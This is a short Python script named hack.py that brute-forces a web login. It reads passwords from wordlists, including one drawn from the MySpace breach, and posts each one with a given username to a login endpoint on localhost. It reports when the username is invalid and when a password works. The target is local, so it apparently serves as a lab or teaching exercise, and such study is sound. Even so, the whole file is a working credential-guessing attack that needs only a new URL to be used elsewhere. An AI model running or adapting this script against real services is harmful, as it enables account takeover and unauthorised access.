import os
import sys

import requests


def hack(username, passwords):
    for count, password in enumerate(passwords):
        data = {
            'username': username,
            'password': password
        }

        resp = requests.post('http://127.0.0.1:5000/login', data=data)

        if resp.status_code == 404:
            print(f'Username {username} is not valid')
            return

        elif resp.status_code == 200:
            print(f'Password for {username} is {password}')
            return

        if count % 10 == 0:
            print(f'Tried {count} passwords')

    print(f'Could not find password for {username}')


def main(args):
    username = args[1]

    current_dir = os.getcwd()
    if '--use_myspace' in args:
        password_file = os.path.join(current_dir, 'password_lists/myspace.txt')
    else:
        password_file = os.path.join(current_dir, 'password_lists/common_passwords.txt')

    with open(password_file) as password_list:
        passwords = password_list.read().split('\n')

    hack(username, passwords)


if __name__ == '__main__':
    if len(sys.argv) == 1:
        print('Usage: python hack.py username [--use_myspace]')
        sys.exit(0)

    main(sys.argv)
